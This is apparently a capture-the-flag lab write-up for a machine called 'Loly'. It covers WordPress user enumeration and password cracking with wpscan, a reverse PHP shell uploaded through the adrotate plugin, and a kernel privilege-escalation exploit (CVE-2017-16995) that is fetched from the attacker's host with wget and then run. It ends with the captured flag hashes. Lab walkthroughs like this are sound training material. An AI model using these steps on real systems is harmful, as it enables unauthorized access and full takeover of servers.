# Loly

**IP Address:** 192.168.238.121

## Enumeration
### Open Ports
| Port #| Service | Details  |
|:------|:---------|:---------|
| 80 | http | nginx 1.10.3 (Ubuntu) |

## Exploitation
### Exploit Details (Weak Credentials)
* **Name** - Weak Credentials
* **CVE** - N/A
* **Module** - N/A
* **Disclosed** - N/A
* **References**
  * N/A

1. First we enumerate the Wordpress users. 

Commands
```
wpscan --url http://$ip/wordpress --enumerate u
```

![Execute Exploit](images/exploit1.png)

![Execute Exploit](images/exploit2.png)

2. Crack the password for the user. 

Commands
```
wpscan --url http://$ip/wordpress -U loly -P /usr/share/wordlists/rockyou.txt
```

![Execute Exploit](images/exploit3.png)

![Execute Exploit](images/exploit4.png)


3. Login to the wordpress admin site. Zip up a reverse php shell. Then in the adrotate section select browse and select the zipped shell. Then click on Upload file. 

![Execute Exploit](images/exploit5.png)

4. Initiate the reverse shell and catch it using netcat. 

Commands
```bash
curl http://$ip/wordpress/wp-content/banners/shell.php
whoami
cat /var/www/local.txt
```

![Execute Exploit](images/exploit6.png)

![Execute Exploit](images/exploit7.png)

## Privilege Escalation
### Exploit Details (Searchsploit)
* **Name** - Linux Kernel < 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation
* **CVE** - 2017-16995
* **Module** - linux/local/45010.c
* **Disclosed** - 2018-07-10
* **References**
  * https://nvd.nist.gov/vuln/detail/CVE-2017-16995
  * https://www.exploit-db.com/exploits/45010

Commands
```bash
wget http://$lhost/linux/exploits/kernel/45010; chmod +x 45010; ./45010
whoami
cat /root/proof.txt
```
![Execute Exploit](images/privesc1.png)

## Loot
```
local.txt
c3374b63b2f999a77fc05d893db8e325
proof.txt
2ca70a909dbee184c387f21ff058e836
```